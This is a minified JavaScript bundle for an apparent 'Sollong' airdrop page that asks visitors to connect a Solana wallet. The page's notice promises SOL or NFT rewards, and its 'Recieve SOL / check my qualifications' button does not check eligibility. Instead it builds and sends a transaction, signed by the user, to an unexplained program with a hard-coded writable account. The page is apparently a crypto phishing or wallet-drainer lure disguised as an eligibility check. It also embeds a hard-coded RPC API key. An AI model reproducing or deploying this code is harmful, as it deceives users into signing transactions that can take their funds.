(()=>{"use strict";var e={3883:function(e,i,a){var t=a("5893"),l=a("7294"),n=a("745"),c=a("4493"),s=a("8367"),r=a("8143"),I=a("6618");let o=a.p+"static/image/logo.8f451d87.8f451d87.png",d=a.p+"static/svg/logo.0308888e.svg",g=a.p+"static/image/bg_7.953307b9.953307b9.png";var u=a("5560"),M=a("8140");let A=a.p+"static/media/global.3f6526c5.mp4";var N=a("7216"),m=a("5362"),x=a("2988");let j=()=>{let{setVisible:e}=(0,N.h)(),{connection:i}=(0,u.R)(),{sendTransaction:a,signTransaction:n}=(0,M.O)(),[c,s]=(0,l.useState)(!1),{buttonState:r,onConnect:I,onDisconnect:j,publicKey:y}=(0,m.i)({onSelectWallet(){e(!0)}}),D=(0,l.useCallback)(()=>{switch(r){case"no-wallet":e(!0);break;case"has-wallet":I&&I()}},[r]),p=(0,l.useMemo)(()=>{if(!y)return"CONNECT WALLET";{let e=y.toBase58();return e.slice(0,4)+".."+e.slice(-4)}},[r,y]),h=(0,l.useCallback)(async()=>{if(y){if(!c)try{s(!0),console.log("publicKey ===>",y);let e=await i.getLatestBlockhash("finalized"),t=new x.nh("BYw4MfoTYt4mm9LQ2EtftpmqJyPZe628oj5NaZYeGKY"),l=await i.getAccountInfo(new x.nh(t));console.log("accountInfo ===>",l);let n=[{pubkey:y,isSigner:!0,isWritable:!1},{pubkey:t,isSigner:!1,isWritable:!0},{pubkey:x.yc.programId,isSigner:!1,isWritable:!1}],c=new x.YW({lastValidBlockHeight:e.lastValidBlockHeight,blockhash:e.blockhash,feePayer:y});c.add(new x.Sl({programId:new x.nh("C8c5MHbCK8DmH3PXmNbk6mbYhoBCJn1x1orsUhDdDswj"),keys:n}));let r=await a(c,i);console.log("signature ===>",r),s(!1)}catch(e){console.error(e),s(!1)}}else D()},[D,y,i]);return(0,t.jsxs)("div",{className:"text-center relative bg-black min-h-[100vh] w-full mb-[120px]  pt-[80px]",children:[(0,t.jsx)("div",{className:"bg-transparent transition-all fixed top-0 w-full z-[99999]",children:(0,t.jsxs)("div",{className:"w-full flex-between px-4 h-20 md:h-[6.25rem] relative z-50 max-w-[450px]",children:[(0,t.jsx)("div",{children:(0,t.jsxs)("a",{href:"https://sollong.xyz",className:"flex",target:"_blank",children:[(0,t.jsx)("img",{src:o,className:"cursor-pointer m-auto w-auto h-8",width:"72",height:"72",decoding:"async","data-nimg":"1",loading:"lazy",style:{color:"transparent"}}),(0,t.jsx)("img",{alt:"vision logo",src:d,width:"87",height:"10",decoding:"async","data-nimg":"1",className:"cursor-pointer m-auto w-auto h-3 ml-2",loading:"lazy",style:{color:"transparent"}})]})}),(0,t.jsx)("div",{className:"flex-center",children:(0,t.jsxs)("button",{className:"flex items-center justify-center  rounded-full py-2 px-3 md:px-4 text-center uppercase  bg-primary text-white text-xs btn-gridient",children:[y&&(0,t.jsx)("img",{alt:"wallet",src:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAADpSURBVHgB7ZfREcIgDIaDE9QNHKGeC3SEbmBXcALrZHUD3AA3sBvExIZe7B2PSV/47nJA4Jq/5OACgICIDdmdbEI7ItkAW8h5IkvoR+KYWkBSEx1ZAwbQd/tNrIadw5/DGFxSnUWM7Igy6MEJ2WVmgpwUcER24UfIwQMBjuS4B9iZKqAKMBNwQbyeET9kqaV+aZ3ZMeTA1JxkOMcQjnre4xjqa30uLTITQL93o+bNwan/KK2rN2EVUAWsAjzKsZKAp/RbcEKVfy8ejDsWpcPWkayKU4nT6Vh6ct+HiRLCb4SIdky4pHxN9RdwyJ3/VUHmDgAAAABJRU5ErkJggg==",width:"32",height:"28",decoding:"async","data-nimg":"1",className:"w-[1.2rem]",loading:"lazy",style:{color:"transparent"}}),(0,t.jsx)("span",{onClick:D,className:"mt-[1px] mx-2",children:p}),y&&(0,t.jsx)("div",{children:(0,t.jsx)("img",{onClick:()=>null==j?void 0:j(),alt:"wallet",src:"data:image/svg+xml;base64,IDxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHZpZXdCb3g9IjAgMCAxNCAxNCIgZmlsbD0ibm9uZSI+DQogIDxnIGNsaXBQYXRoPSJ1cmwoI2NsaXAwXzMxMl8zMzMpIj4NCiAgICA8cGF0aCBkPSJNMTIuOTg5NiA2LjY2ODc2TDEwLjUzMTcgNC4zMDI0NkMxMC4zMzUxIDQuMTEzMDkgMTAuMDQwMiA0LjExMzA5IDkuODQzNTQgNC4zMDI0NkM5LjY0NjkxIDQuNDkxNyA5LjY0NjkxIDQuNzc1NyA5Ljg0MzU0IDQuOTY1MDdMMTEuNDY1NyA2LjUyNjc4SDYuNzQ2NThDNi40NTE2MyA2LjUyNjc4IDYuMjU1IDYuNzE2MDIgNi4yNTUgNy4wMDAwMUM2LjI1NSA3LjI4NDAxIDYuNDUxNjMgNy40NzMyNSA2Ljc0NjU4IDcuNDczMjVIMTEuNDY1N0w5Ljg0MzY1IDkuMDM0OTZDOS42NDcwMiA5LjIyNDMzIDkuNjQ3MDIgOS41MDgzMiA5Ljg0MzY1IDkuNjk3NTdDOS45NDE5OCA5Ljc5MjMyIDEwLjA0MDMgOS44Mzk1NyAxMC4xODc3IDkuODM5NTdDMTAuMzM1MiA5LjgzOTU3IDEwLjQzMzUgOS43OTIxOSAxMC41MzE5IDkuNjk3NTdMMTIuOTg5NyA3LjI4NDAxQzEyLjk4OTcgNy4yODQwMSAxMi45ODk3IDcuMjM2NjMgMTMuMDM4OSA3LjIzNjYzQzEzLjE4NjMgNy4wOTQ2NCAxMy4xODYyIDYuODEwNzUgMTIuOTg5NiA2LjY2ODc2WiIgZmlsbD0id2hpdGUiLz4NCiAgICA8cGF0aCBkPSJNMTIuMjUgMy41VjMuNUMxMi4yNSAyLjA1MDI1IDExLjA3NDcgMC44NzUgOS42MjUgMC44NzVIMy44NzVDMi4yMTgxNSAwLjg3NSAwLjg3NSAyLjIxODE1IDAuODc1IDMuODc1VjEwLjEyNUMwLjg3NSAxMS43ODE5IDIuMjE4MTUgMTMuMTI1IDMuODc1IDEzLjEyNUg5LjYyNUMxMS4wNzQ3IDEzLjEyNSAxMi4yNSAxMS45NDk3IDEyLjI1IDEwLjVWMTAuNSIgc3Ryb2tlPSJ3aGl0ZSIvPg0KICA8L2c+DQogIDxkZWZzPg0KICAgIDxjbGlwUGF0aCBpZD0iY2xpcDBfMzEyXzMzMyI+DQogICAgICA8cmVjdCB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIGZpbGw9IndoaXRlIi8+DQogICAgPC9jbGlwUGF0aD4NCiAgPC9kZWZzPg0KPC9zdmc+",width:"32",height:"28",decoding:"async","data-nimg":"1",className:"w-[1.2rem]",loading:"lazy",style:{color:"transparent"}})})]})})]})}),(0,t.jsx)("img",{alt:"",src:g,width:"750",height:"1010",decoding:"async","data-nimg":"1",className:"absolute left-0 top-0",loading:"lazy",style:{color:"transparent"}}),(0,t.jsx)("div",{className:"flex items-center justify-between pr-4 relative z-100",children:(0,t.jsx)("span",{className:"mt-[1px]"})}),(0,t.jsx)("div",{className:"relative z-100",children:(0,t.jsxs)("div",{className:"p-2 mb-6",children:[(0,t.jsx)("div",{className:"py-4",children:(0,t.jsxs)("div",{className:"m-auto text-center relative mb-2",children:[(0,t.jsx)("img",{alt:"",src:"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMjQzIiBoZWlnaHQ9IjI0MyIgdmlld0JveD0iMCAwIDI0MyAyNDMiIGZpbGw9Im5vbmUiPg0KICAgIDxkZWZzPg0KICAgICAgICA8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfMTM5NV8yMjIiIHgxPSIxMzQuNzc3IiB5MT0iNS44NjEzNiIgeDI9IjEwNy4wNCIgeTI9IjI0MS4xMTEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4NCiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IndoaXRlIi8+DQogICAgICAgICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IndoaXRlIiBzdG9wLW9wYWNpdHk9IjAiLz4NCiAgICAgICAgPC9saW5lYXJHcmFkaWVudD4NCiAgICAgICAgPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDFfbGluZWFyXzEzOTVfMjIyIiB4MT0iMTIxLjE4IiB5MT0iMTIuMDI5NiIgeDI9IjEyMS4xOCIgeTI9IjIzOC40NTgiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4NCiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IndoaXRlIi8+DQogICAgICAgICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IndoaXRlIiBzdG9wLW9wYWNpdHk9IjAuMTMiLz4NCiAgICAgICAgPC9saW5lYXJHcmFkaWVudD4NCiAgICA8L2RlZnM+DQogICAgPGNpcmNsZSBjeD0iMTIxLjE4IiBjeT0iMTIxLjE4IiByPSIxMDkuMTUiIHRyYW5zZm9ybT0icm90YXRlKC02LjcyNDI5IDEyMS4xOCAxMjEuMTgpIiBzdHJva2U9InVybCgjcGFpbnQwX2xpbmVhcl8xMzk1XzIyMikiIHN0cm9rZS13aWR0aD0iOCIgc3Ryb2tlLWRhc2hhcnJheT0iMSAxMCIgc3Ryb2tlLWRhc2hvZmZzZXQ9IjAiPg0KICAgICAgICA8YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJzdHJva2Utd2lkdGgiIHZhbHVlcz0iODszOzgiIGR1cj0iMnMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIi8+DQogICAgPC9jaXJjbGU+DQogICAgPGNpcmNsZSBjeD0iMTIxLjE4IiBjeT0iMTIxLjE4IiByPSIxMDkuMTUiIHRyYW5zZm9ybT0icm90YXRlKDEuNTgxMDQgMTIxLjE4IDEyMS4xOCkiIHN0cm9rZT0idXJsKCNwYWludDFfbGluZWFyXzEzOTVfMjIyKSIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtZGFzaGFycmF5PSIxIDEwIiBzdHJva2UtZGFzaG9mZnNldD0iMCI+DQogICAgICAgIDxhbmltYXRlIGF0dHJpYnV0ZU5hbWU9InN0cm9rZS13aWR0aCIgdmFsdWVzPSIzOzg7MyIgZHVyPSIycyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiLz4NCiAgICA8L2NpcmNsZT4NCjwvc3ZnPg==",width:"243",height:"243",decoding:"async","data-nimg":"1",className:"w-[68%] loader_1 m-auto",loading:"lazy",style:{color:"transparent"}}),(0,t.jsx)("div",{className:"absolute top-1/2 left-1/2 -translate-x-[50%] -translate-y-[50%] w-[60%] rounded-full overflow-hidden",children:(0,t.jsx)("video",{muted:!0,src:A,autoPlay:!0,loop:!0,playsInline:!0,className:"w-full"})})]})}),(0,t.jsxs)("div",{className:"bg-[#391C8C] bg-opacity-40 rounded-2xl border border-white border-opacity-20 backdrop-blur-sm p-5 -mt-12 relative",children:[(0,t.jsx)("div",{className:"text-xl text-[#FFFFFF]",children:"Notice "}),(0,t.jsx)("div",{className:"text-[#B6ADC7] text-sm mt-1 ",children:"We are excited to announce that SOLLONG APP has successfully landing in IOS and Android! To reward supporters who  participate reinvestment with a cumulative amount of more than 2 SOL, we will airdrop more than 2 NFT(ENA) or 5 SOL to eligible participants. Please click button to check your qualifications."}),(0,t.jsx)("button",{onClick:h,className:"text-[14px] flex items-center justify-center  rounded-full py-2 px-3 md:px-4 text-center uppercase  bg-primary text-white w-full mt-3 !bg-[#6822E3] rounded-lg !py-1",children:(0,t.jsxs)("div",{children:[(0,t.jsx)("div",{className:"text-[14px]",children:c?"Wait...":"Recieve SOL"}),(0,t.jsx)("div",{className:"text-[12px] opacity-60 leading-3 font-['SF Pro Display']",children:"check my qualifications"})]})})]})]})})]})};a("6531");let y=document.getElementById("root");document.title="sollong",y&&n.createRoot(y).render((0,t.jsx)(l.StrictMode,{children:(0,t.jsx)(()=>{let e=[new I.O];return(0,t.jsx)(c.U,{endpoint:"https://mainnet.helius-rpc.com/?api-key=7211c252-9672-4783-a387-0e51e17ee812",children:(0,t.jsx)(s.n,{wallets:e,autoConnect:!0,children:(0,t.jsx)(r.s,{children:(0,t.jsx)(j,{})})})})},{})}))},7567:function(){}},i={};function a(t){var l=i[t];if(void 0!==l)return l.exports;var n=i[t]={id:t,loaded:!1,exports:{}};return e[t].call(n.exports,n,n.exports,a),n.loaded=!0,n.exports}a.m=e,a.n=function(e){var i=e&&e.__esModule?function(){return e.default}:function(){return e};return a.d(i,{a:i}),i},a.d=function(e,i){for(var t in i)a.o(i,t)&&!a.o(e,t)&&Object.defineProperty(e,t,{enumerable:!0,get:i[t]})},a.o=function(e,i){return Object.prototype.hasOwnProperty.call(e,i)},a.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},a.nmd=function(e){return e.paths=[],!e.children&&(e.children=[]),e},(()=>{var e=[];a.O=function(i,t,l,n){if(t){n=n||0;for(var c=e.length;c>0&&e[c-1][2]>n;c--)e[c]=e[c-1];e[c]=[t,l,n];return}for(var s=1/0,c=0;c<e.length;c++){for(var t=e[c][0],l=e[c][1],n=e[c][2],r=!0,I=0;I<t.length;I++)(!1&n||s>=n)&&Object.keys(a.O).every(function(e){return a.O[e](t[I])})?t.splice(I--,1):(r=!1,n<s&&(s=n));if(r){e.splice(c--,1);var o=l();void 0!==o&&(i=o)}}return i}})(),a.p="https://not-undefined-really.github.io/sollong-airdrop/",a.rv=function(){return"1.0.0-beta.3"},(()=>{var e={980:0};a.O.j=function(i){return 0===e[i]};var i=function(i,t){var l=t[0],n=t[1],c=t[2],s,r,I=0;if(l.some(function(i){return 0!==e[i]})){for(s in n)a.o(n,s)&&(a.m[s]=n[s]);if(c)var o=c(a)}for(i&&i(t);I<l.length;I++)r=l[I],a.o(e,r)&&e[r]&&e[r][0](),e[r]=0;return a.O(o)},t=self.webpackChunkn_money=self.webpackChunkn_money||[];t.forEach(i.bind(null,0)),t.push=i.bind(null,t.push.bind(t))})(),a.ruid="bundler=rspack@1.0.0-beta.3";var t=a.O(void 0,["361","686"],function(){return a("3883")});t=a.O(t)})();